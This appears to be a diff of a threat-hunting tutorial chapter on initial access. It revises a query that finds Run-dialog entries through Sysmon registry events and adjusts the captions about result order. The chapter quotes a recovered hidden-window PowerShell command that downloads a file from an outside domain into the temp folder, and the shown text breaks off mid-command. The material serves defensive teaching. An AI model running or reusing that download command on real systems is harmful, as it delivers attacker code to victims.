@@ -13,11 +13,11 @@ title: "2. Initial access"
 When a user presses ++win+r++ and runs something, Explorer writes the command to the `RunMRU` registry key. Sysmon logs the write as event 13 (registry value set).
 
 ```bql
-event_id="13" target_object=~"\\RunMRU\\" | target_object!=$"MRUList" | sort(timestamp) | table(timestamp, computer_name, image, details)
+event_id="13" target_object=~"\\RunMRU\\" | target_object!=$"MRUList" | table(timestamp, computer_name, image, details)
 ```
-<!-- shot: q003-runmru | Everything typed into the Run dialog, oldest first. | rows=3 -->
+<!-- shot: q003-runmru | Everything typed into the Run dialog, newest first. | rows=3 -->
 
-There are three entries, all on WS02 and all written by Explorer. The first is at **14:02:27.543**, within milliseconds of the PowerShell process from chapter 1:
+There are three entries, all on WS02 and all written by Explorer. The first, at the bottom, is at **14:02:27.543**, within milliseconds of the PowerShell process from chapter 1:
 
 ```text
 powershell -w h -c "$t=$env:temp;iwr 'https://update-cache-m9tdco18phmc.com/a/.../pkg?...' -o $t\q;
